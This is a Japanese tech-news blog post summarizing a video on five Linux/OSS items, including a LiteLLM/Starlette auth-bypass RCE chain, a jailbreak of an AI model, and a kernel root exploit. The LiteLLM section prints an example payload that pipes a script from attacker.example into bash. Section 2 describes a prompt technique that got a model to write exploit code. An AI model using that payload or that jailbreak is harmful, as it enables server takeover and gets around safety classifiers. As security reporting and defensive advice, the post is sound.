---
title: "AIが乗っ取られ、規制で消え、見逃した——「基盤の点検」を怠ると何が起きるか（2026年7月6日）"
date: 2026-07-06T00:00:00+09:00
draft: false
tags: ["linux", "security", "AI", "LiteLLM", "Linux-kernel", "Ubuntu", "Arch Linux"]
categories: ["Linux・OSSトレンド"]
---

> この記事は、2026年7月6日（月）公開の動画「AIが乗っ取られ AIが規制で消え AIが見逃した 層は違えど根っこは一つ AIも人も 基盤の点検を怠れば代償を払う 2026年07月06日(月)」を中心に、特に注目したいポイントをピックアップして解説したものです。

{{< youtube "4BN8KPxdfB8" >}}

今週の Linux/OSS シーンは、「AI」という言葉が三度、まったく違う顔で登場した。 **AI が乗っ取られ** （LiteLLM ゲートウェイへの認証不要 RCE）、 **AI が規制で消え** （Claude Fable 5 の輸出規制）、そして **AI が見逃した** （AI が発見したバグの隣に、AI が見つけられなかったカーネルの穴があった）。

一見バラバラなこれらのニュースは、動画のタイトルが言い当てているとおり、根っこが一つだ—— **「基盤（土台）の点検を怠れば、代償を払う」** 。AI ゲートウェイ、フロンティアモデルの安全評価、9か月でサポートが切れる OS、インストーラーの作り直し、そして3年間メインラインに眠っていたカーネルの競合状態。層は違っても、点検を怠った基盤がどう牙をむくかという一点で、すべてがつながる。強→中→弱→中→強の順で、密度高く見ていこう。

---

## 1. LiteLLM CVE-2026-42271 — AIゲートウェイを「認証ゼロ」で乗っ取る CVSS 10 の攻撃チェーン

### 概要

まず飛び込んでくるのが、AI インフラの「要」を直撃する脆弱性だ。GitHub で **1万5千スター** を超えるオープンソースの AI ゲートウェイ **LiteLLM** に、認証なしで任意コマンドを実行できる **CVSS 10.0** の攻撃チェーンが成立した。単体では CVSS 8.7 のコマンドインジェクション **CVE-2026-42271** と、CVSS 6.5 の Starlette ホストヘッダーバイパス **CVE-2026-48710** （通称 "BadHost"）——この2つを連鎖させると、最大値の 10.0 になる。CISA は2026年6月8日に KEV（既知悪用脆弱性）カタログへ登録し、その後も野生での悪用が続いている。

### 技術詳細

LiteLLM は OpenAI・Anthropic・Google・Azure など複数の LLM プロバイダーへの統一インターフェースを提供するプロキシで、コスト管理・レート制限・ログ収集を一手に引き受ける。裏を返せば、 **すべてのプロバイダーの API キーがここに集約されている** 。攻撃者にとっては「AI の金庫室」を一撃で狙える標的だ。

1本目の穴、 **CVE-2026-42271** は、MCP サーバー設定をテストするためのエンドポイント（`POST /mcp-rest/test/connection` と `POST /mcp-rest/test/tools/list`）にある。これらはリクエストボディの `command`・`args`・`env` を検証もサンドボックス化もせず、そのままプロキシホスト上でサブプロセスとして実行してしまう。たとえば `command` に `/bin/bash`、`args` に `["-c", "curl http://attacker.example/shell.sh | bash"]` を指定した JSON を送るだけで、リバースシェルが起動する。対象は LiteLLM **1.74.2〜1.83.6** 、修正版は **1.83.7** 以降だ。

ただし、このエンドポイントは本来「有効なプロキシ API キーがある認証済みユーザー」だけが叩けるはずだった。そこで効いてくるのが2本目、 **CVE-2026-48710 "BadHost"** だ。Starlette v1.0.0 以下では、HTTP リクエストの `Host` ヘッダーが `request.url` を再構築する前に適切に検証されない。ルーティングは生の HTTP パスを見るのに、`request.url.path` は Host ヘッダーから作り直される——この乖離を突くと、パスベースの認証ミドルウェアに「実際とは違うパス」を見せて認証チェックを丸ごとスキップできる。しかもこのバイパスは **「1文字の操作」** で成立するというシンプルさだ。

攻撃チェーン全体はこうなる。細工した Host ヘッダー付きの POST を送る → BadHost で認証ミドルウェアが別パスを参照し認証をスキップ → テストエンドポイントに到達 → コマンドインジェクションでホスト上の任意コマンドが走る。 **認証情報ゼロでサーバー乗っ取り完了** だ。8.7 と 6.5 という「単体ではそこそこ」の脆弱性が、合わさると最大値 10.0 になる非線形さがこの一件の怖さを物語る。

### なぜ重要か（エンジニア視点）

見逃せないのは、LiteLLM がこの約1か月前にも別の深刻な脆弱性（SQL インジェクション、CVSS 9.3）を抱え、公開からわずか **36時間** で野生での悪用が確認されていたことだ。 **「LiteLLM は連続して狙われている」** という文脈がある。AI ブームでインフラの中心に据えられたコンポーネントほど、攻撃者の視線が集中する。

BadHost の影響は LiteLLM にとどまらない。Starlette を依存に持つ FastAPI・vLLM・MCP サーバー・エージェントハーネス・評価ダッシュボードなど、広範な Python ASGI アプリが同じバイパスの射程に入る。「うちは LiteLLM を使っていないから無関係」とは言い切れない。

**対応の優先順位** はシンプルだ。まず `pip install "litellm>=1.83.7" "starlette>=1.0.1"`（uv なら `uv add`）でパッチを当てる。即時対応が難しければ、リバースプロキシで `/mcp-rest/test/*` への POST をブロックし、LiteLLM をインターネットに露出させないこと。そして侵害を想定するなら、集約されている **全プロバイダーの API キーをローテーション** する。金庫室の鍵は、覗かれたと思ったら全部替えるのが鉄則だ。

---

## 2. Claude Fable 5 — 米輸出規制からわずか19日で復帰した「前例なき事態」

### 概要

続いては、AI が「規制で消えた」話だ。Anthropic が2026年6月9日に公開した最上位モデル **Claude Fable 5** は、公開からわずか3日後の6月12日、米商務省の輸出規制指令を受けて **グローバルアクセスを全停止** した。Anthropic は専用のサイバーセキュリティ分類器を追加訓練し、6月30日の規制解除を経て7月1日に提供を再開する。規制発動から解除まで **18〜19日間** という異例の速さで決着したが、AI 安全評価と政府介入のあり方をめぐる問いを業界に残した。

### 技術詳細

きっかけは、Amazon の研究者が見つけたプロンプト技法だった。「特定のコードベースを読み込み、ソフトウェアの欠陥を修正せよ」と指示する構造で、これにより Fable 5 は既知の軽微な脆弱性を数件指摘し、うち1件では **エクスプロイトコードを生成** してしまった。Anthropic は同等の動作が自社の弱いモデル（Claude Opus 4.8）を含む複数の他社モデルでも再現されることを確認し、これを **「狭義の非普遍的なジェイルブレイク」** と分類している。

対応策の核心は、報告された動作パターンを標的にした専用の安全分類器を追加訓練したことだ。この分類器は問題の手法を **「99%超のケースでブロック」** するとされる。面白いのはトリガー時の挙動で、リクエストを一律拒否するのではなく、より弱い Claude Opus 4.8 へ **自動フォールバック** し、ユーザーに通知が届く仕組みになっている。Anthropic はモデルの拒否訓練・事後の悪用解析・自動分類器の三重構造を「防御の多層化（defense in depth）」と表現した。ただし、この分類器は通常のコーディングやデバッグでも **誤検知（false positive）** が増える副作用があり、継続的な調整が要るという。

さらに Anthropic は、ジェイルブレイクの深刻度を測る業界横断のスコアリング枠組みも提案した。（1）既存ツールを超える能力向上、（2）解放される攻撃的タスクの広さ、（3）武器化の容易さ、（4）手法の発見容易性——この4基準で評価する。フロンティア AI に標準化されたリスク評価基準がないという業界の空白を、自ら埋めにいく動きだ。

### なぜ重要か（エンジニア視点）

技術的な緩和策以上に重いのが、 **政府介入の前例** としての意味だ。米商務省はこれまでも AI チップの輸出規制を敷いてきたが、モデルウェイトや API アクセスそのものへの直接規制は前例がなく、今回が事実上の先例になる。二重用途技術を扱う枠組みを「ソフトウェアとしての大規模言語モデル」に適用した、という点で新しいフェーズだ。

規制解除にあたり Anthropic は、（1）自発的なセキュリティ問題の探索、（2）将来のモデルローンチ時の事前調整、（3）悪用発見時の報告、という三条件を受け入れた。とりわけ **「将来のローンチ前に政府と相談する」** という条件は、ソフトウェアリリースへの事実上の事前審査制の萌芽として業界に受け止められている。多数の研究者・起業家・企業幹部が「AI リスク評価の開放的・科学的・透明なプロセス」を求める公開書簡を出したのも、この構造への危機感の表れだ。私たちが日々叩く API の向こう側で、「誰がどの基準でモデルを止められるのか」という統治のルールがまさに書かれつつある。

---

## 3. Ubuntu 25.10 "Questing Quokka" — 7月9日 EOL、猶予はあと3日

### 概要

ここで一息、堅実な保守運用の話題を挟もう。 **Ubuntu 25.10 "Questing Quokka"** が2026年7月9日（木）に **サポート終了（EOL）** を迎える。以降はセキュリティパッチもバグ修正もドライバー更新も一切提供されない。25.10 は2025年10月にリリースされた「インタリム（中間）リリース」で、LTS ではないためサポートは標準の **9か月** どおり——7月9日は最初から決まっていた終了日だ。

### 技術詳細

短命なインタリムリリースとはいえ、25.10 は次期 LTS への布石として重要な新機能を先行搭載していた。デスクトップが **Wayland 専用** となり、Ubuntu として初めて「X.org セッションが消えた」バージョンになったこと。`sudo` の実装が C 言語から Rust 製の **sudo-rs** （v0.2.8）へ置き換わり、メモリ安全性の観点で注目を集めたこと。初期 RAM ディスクがデスクトップ版で `initramfs-tools` から **Dracut** へ移行したこと。依存解決に **APT 3.1** の新ソルバーが入り `apt why` が追加されたこと。NTP クライアントが `systemd-timesyncd` から NTS 対応の **Chrony** （v4.7）へ切り替わったこと——。カーネルは 6.17、GNOME は 49 を採用している。

これらはすべて、次世代 LTS である **26.04** に向けた「実地試験」だった。新機能を9か月間かけて広いユーザー層に試させ、問題を洗い出してから LTS に取り込む——Canonical の伝統的な開発サイクルそのものだ。

### なぜ重要か（エンジニア視点）

EOL 後に起こりうるリスクは具体的だ。新しい CVE に公式修正が出ない。PPA やサードパーティリポジトリが止まり `apt update` で依存が壊れる。クラウド AMI や Docker Hub の公式イメージ更新も停止する。インタリムリリースはそもそも検証・開発用途向けで、本番運用は推奨されていない。

対応は素直で、`sudo apt update && sudo apt full-upgrade` で足場を固めてから `sudo do-release-upgrade` を実行する。移行先の **Ubuntu 26.04 LTS "Resolute Raccoon"** は2026年4月にリリース済みで、サポートは5年（Ubuntu Pro なら ESM で最大10年）だ。「基盤の点検を怠れば代償を払う」——このテーマがもっとも日常的な形で現れるのが、EOL の見落としだ。カレンダーに印を付けておこう。

---

## 4. Arch Linux 2026.07.01 ISO — Kernel 7.0.14 と、親切になった ArchInstall 4.4

### 概要

保守運用の谷から、前向きなアップデートへ。Arch Linux の7月度定期 ISO **2026.07.01** がリリースされた。目玉は Linux カーネル **7.0.14** と、Textual ライブラリ製のフル TUI インストーラー **ArchInstall 4.4** の同梱だ。LUKS2 対応、カラーコード化した設定プレビュー、IWD 単独選択など、新規インストール体験が大きく刷新された。

### 技術詳細

ISO にはデフォルトカーネル 7.0.14、LTS 系 6.18.37、systemd 261.1、GCC 16.1.1、glibc 2.43、Python **3.14.6** などが収録される。デスクトップ環境は KDE Plasma 6.7.1、GNOME 50.3、System76 の COSMIC Desktop 1.1。ローリングリリースらしく、上から下まで最新で固めた構成だ。

今回の主役は **ArchInstall 4.4** だ。「玄人向けで不親切」と言われがちだった Arch のインストーラーが、次の改善で一気に親しみやすくなった。

1. **カラーコード化された設定プレビュー** ——エラーは赤、警告は黄、設定完了は緑。「ディスクに書き込む前に気づける」体験になった。
2. **LUKS2 フルディスク暗号化** ——独自の暗号スイートを選べ、パスフレーズのハッシュはデフォルトで yescrypt。EFI パーティションの権限も fmask/dmask=0077 で強化された。
3. **IWD スタンドアロン対応** ——IWD をネットワークマネージャーと分離して単独選択できるようになった。
4. **ログ共有機能** —— `archinstall share-log` でインストールログを paste.rs へ自動アップロードし、サポートフォーラムへの貼り付けが楽になった。
5. **バグ修正** —— sway+NVIDIA の無限ループ、bspwm の黒画面問題を修正。

ちょっとした豆知識も添えておきたい。実はカーネル **7.0 系は6月27日に Greg Kroah-Hartman によって EOL 宣言済み** で、7.0.14 はその直前の最終安定版だ。「最新を追う Arch がなぜ EOL カーネルを?」と思うかもしれないが、月次スナップショットのサイクル上、EOL 宣言直後の ISO にたまたま最終版が乗っただけ。既存ユーザーは `pacman -Syu` で後継カーネルへ自動移行できる。

### なぜ重要か（エンジニア視点）

このリリースが直接効くのは **新規に Arch をインストールするユーザー** だ。既存ユーザーはローリングリリースの恩恵で `pacman -Syu` を回すだけで同等の更新を受け取れる。ArchInstall 4.4 の改善は特に、誤設定のままインストールが走るリスクを減らしたい初心者・再インストール派、追加設定なしで堅牢な暗号化ディスクを組みたいセキュリティ意識の高いユーザー、そして IWD 周りの修正が効く Wi-Fi 環境のユーザーに恩恵をもたらす。

LiteLLM や後述の Bad Epoll が「点検を怠った基盤が牙をむく」話だとすれば、ArchInstall 4.4 は逆向きだ。「ディスクに書き込む前に、色で気づかせる」——点検を仕組みで支援する、地味だが正しい前進である。

---

## 5. "Bad Epoll" CVE-2026-46242 — 3年間眠っていた epoll の穴が、99%の確率で root を渡す

### 概要

最後は、今週いちばん重い話だ。2026年7月3日に公開された Linux カーネルの epoll サブシステムの UAF（Use-After-Free）脆弱性 **CVE-2026-46242 "Bad Epoll"** 。カーネル **6.4 以降** が動くサーバー・デスクトップ・Android 端末すべてで、非特権ユーザーが公開 PoC を使って **約99%の成功率** で root 権限を奪取できる。しかも **ワークアラウンドは存在しない** 。そして——動画タイトルの「AI が見逃した」がここで回収される。Anthropic の AI モデル Mythos が同じコードブロックの隣接バグを発見しながら、この脆弱性は **すり抜けた** のだ。

### 技術詳細

根本原因は `ep_remove()` 関数の競合状態にある。この関数は `file->f_lock` を保持しながら `file->f_ep` ポインタを NULL にクリアするが、その後も同じ `file` オブジェクトを参照し続ける。その隙に別スレッドから `__fput()` が並行して呼ばれると、`__fput()` は `f_ep` が NULL なのを見て「もう解放済み」と誤認し、本来スキップすべきでない解放処理へ進んでしまう。結果、まだ使用中の `struct eventpoll` がメモリから解放され、UAF が発生してカーネルメモリが破損する。

タイムラインが示唆に富む。 **脆弱性の混入は2023年4月8日** （commit `58c9b016e128`）、 **修正は2026年4月24日** （commit `a6dc643c6931`）、 **一般公開は2026年7月3日** 。実質同一のコミットが2つの競合状態を約2,500行の epoll コードに埋め込み、 **3年近くメインラインに残り続けた** 。CVSS 3.1 スコアは 7.8（ローカル権限昇格）だ。

エクスプロイトは、Seoul National University CompSec Lab の PhD 研究者 Jaeyoung Chung が Google kernelCTF へのゼロデイ提出として開発した。4つの epoll オブジェクトを2ペアに分け、片方で競合を発火——その競合ウィンドウは **わずか6機械語命令分** の幅しかない——`SLAB_TYPESAFE_BY_RCU` を悪用したクロスキャッシュ攻撃で UAF を拡大し、`/proc/self/fdinfo` 経由で任意のカーネルメモリ読み取りを確立、最後に ROP チェーンで root シェルを取る。この一連が `lts-6.12.67` などのターゲットで **約99%成功** する。通常の race 系エクスプロイトは数%〜数十%がせいぜいなのに、だ。「ほぼ確実に root が取れる race」という異常さが、この脆弱性の格を決めている。

長期間見落とされた背景には、カーネルのメモリエラー検出器 **KASAN がほとんどヒットしない** という事情がある。競合ウィンドウが極端に狭いため、通常のファジングでも静的解析でも再現しにくい。そして——同じコミットに潜む2本の競合状態のうち、1本目は Anthropic の最上位 AI モデル **Mythos** が2026年前半に発見して修正までこぎつけた。だが並存していた2本目（本件 CVE-2026-46242）は Mythos をすり抜けた。 **「AI が見つけたバグの隣に、AI が見つけられなかったバグがあった」** ——この事実は、AI によるコード審査の可能性と限界を同時に突きつける。（なお、1本目の脆弱性は **CVE-2026-43074** として2026年4月2日に修正されている。）

### なぜ重要か（エンジニア視点）

epoll は Web サーバー・データベース・ブラウザ・ネットワークサービスのほぼすべてが依存する、カーネルのイベント通知 API だ。 **epoll を無効化する手段は存在しない** 。つまり脆弱なカーネルを使っている限り、緩和策はなく、 **パッチ適用が唯一の対策** になる。影響は Linux サーバー・デスクトップに加え、Linux 6.6 以降を積む **Android 端末** （Pixel 10 シリーズ等）にも及ぶ。逆に、コミット `58c9b016e128` を含まない **6.1 ベース** のシステム（Pixel 8 や Pixel 9 など）は対象外だ。さらに Chrome のレンダラーサンドボックス内からも実行可能で、サンドボックス脱出への応用が指摘されている——ブラウザを開いているだけで潜在リスクがある、というわけだ。

そして最大の教訓が、パッチのタイムラインにある。 **修正は4月にマージ済みなのに、多くのシステムにはまだ適用されていない** 。「すでに直っているのに、まだ危ない」——これが Linux セキュリティ運用の難しさの核心だ。

対応は最優先でカーネル更新。Ubuntu/Debian は `sudo apt update && sudo apt upgrade linux-image-generic`、RHEL 系は `sudo dnf update kernel`、Arch は `sudo pacman -Syu linux`、いずれも更新後に再起動する。現在のカーネルは `uname -r` で確認できる。Android は OEM や MDM 経由のセキュリティ更新を、スケジュールを待たず即時適用したい。なお CISA の KEV には7月6日時点で未掲載、実運用での悪用事例もまだ報告されていない——が、公開 PoC が出ている以上、猶予は長くないと考えるべきだ。

---

## まとめ

今週の5つのトピックは、動画タイトルの三段構えを軸に、2本の線へ収束する。

**1本目は「AI という新しい基盤の点検」だ。** LiteLLM は、AI ゲートウェイという生まれたばかりの重要インフラが、認証ゼロで乗っ取られる現実を見せた。Claude Fable 5 は、フロンティアモデルの安全評価と政府介入という、まだ誰も正解を持たない統治の問題を突きつけた。そして Bad Epoll では、AI がコード審査で「隣のバグ」を見逃した。攻撃対象としての AI、規制対象としての AI、審査者としての AI——どの顔でも、AI という基盤はまだ点検の途上にある。

**2本目は「古くからある基盤の、地道な点検」だ。** Ubuntu の EOL は、サポート期限というもっとも日常的な基盤点検を思い出させる。Arch の ArchInstall 4.4 は、「書き込む前に色で気づかせる」という点検の仕組み化だ。そして Bad Epoll は、3年前に埋め込まれ4月に直ったのにまだ適用されていない——「直っているのに危ない」という、点検と適用のあいだに横たわる溝を映し出す。

新しかろうが古かろうが、AI だろうが人だろうが、 **基盤の点検を怠れば代償を払う** 。派手な乗っ取りも、静かな EOL も、根っこは同じだ。今日できる点検——パッチを当てる、EOL を確認する、鍵をローテーションする——を、明日に回さないことにしよう。

---

## 一次情報・参考リンク

### 1. LiteLLM CVE-2026-42271 / CVE-2026-48710

- [The Hacker News — LiteLLM Flaw CVE-2026-42271 Exploited in the Wild](https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html)
- [Horizon3.ai — CVE-2026-42271 Chained with CVE-2026-48710](https://horizon3.ai/attack-research/vulnerabilities/cve-2026-42271-chained-with-cve-2026-48710/)
- [CISA — Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [BadHost（CVE-2026-48710）公式情報](https://badhost.org/)
- [Rescana — Active Exploitation Alert: CVE-2026-42271 and CVE-2026-48710](https://www.rescana.com/post/active-exploitation-alert-cve-2026-42271-and-cve-2026-48710-unauthenticated-rce-in-litellm-ai-gateway-via-starlette-host)

### 2. Claude Fable 5 輸出規制

- [Anthropic — Fable & Mythos access（輸出規制指令への声明）](https://www.anthropic.com/news/fable-mythos-access)
- [Anthropic — Redeploying Claude Fable 5](https://www.anthropic.com/news/redeploying-fable-5)
- [MarkTechPost — Anthropic Redeploys Claude Fable 5 After US Export Controls Lift](https://www.marktechpost.com/2026/07/01/anthropic-redeploys-claude-fable-5-on-july-1-after-us-export-controls-lift-adds-new-cybersecurity-classifier/)
- [The Hacker News — Anthropic Restores Claude Fable 5](https://thehackernews.com/2026/07/anthropic-restores-claude-fable-5-after.html)
- [CNBC — Anthropic says Trump admin has lifted export controls on Claude Fable 5 and Mythos 5](https://www.cnbc.com/2026/06/30/anthropic-says-trump-admin-has-lifted-export-controls-on-claude-fable-5-and-mythos-5.html)

### 3. Ubuntu 25.10 EOL

- [Ubuntu 公式リリーススケジュール一覧](https://wiki.ubuntu.com/Releases)
- [Canonical 公式 EOL 告知メール](https://lists.ubuntu.com/archives/ubuntu-announce/2026-June/000324.html)
- [Ubuntu 25.10 公式リリースノート](https://discourse.ubuntu.com/t/questing-quokka-release-notes/59220)
- [9to5Linux — Ubuntu 25.10 Questing Quokka Will Reach End of Life on July 9th, 2026](https://9to5linux.com/ubuntu-25-10-questing-quokka-will-reach-end-of-life-on-july-9th-2026)

### 4. Arch Linux 2026.07.01 ISO / ArchInstall 4.4

- [Arch Linux 公式リリース一覧](https://archlinux.org/releng/releases/)
- [ArchInstall GitHub リリースノート](https://github.com/archlinux/archinstall/releases)
- [Linuxiac — Arch Linux July ISO Is Out With Linux Kernel 7.0.14 and ArchInstall 4.4](https://linuxiac.com/arch-linux-july-iso-is-out-with-linux-kernel-7-0-14-and-archinstall-4-4/)
- [Linuxiac — ArchInstall 4.4 Polishes the Arch Linux Installation Experience](https://linuxiac.com/archinstall-4-4-polishes-the-arch-linux-installation-experience/)

### 5. Bad Epoll CVE-2026-46242

- [J-jaeyoung/bad-epoll — 発見者による公式 PoC・writeup](https://github.com/J-jaeyoung/bad-epoll)
- [OpenCVE — CVE-2026-46242](https://app.opencve.io/cve/CVE-2026-46242)
- [The Hacker News — New "Bad Epoll" Linux Kernel Flaw](https://thehackernews.com/2026/07/new-bad-epoll-linux-kernel-flaw-lets.html)
- [Cybersecurity News — Bad Epoll 0-Day Vulnerability](https://cybersecuritynews.com/bad-epoll-0-day-vulnerability/)
- [TechTimes — Bad Epoll Kernel Race Bug Beats AI Auditing, Hits 99% Root Exploit Rate](https://www.techtimes.com/articles/319686/20260704/bad-epoll-kernel-race-bug-beats-ai-auditing-hits-99-root-exploit-rate.htm)
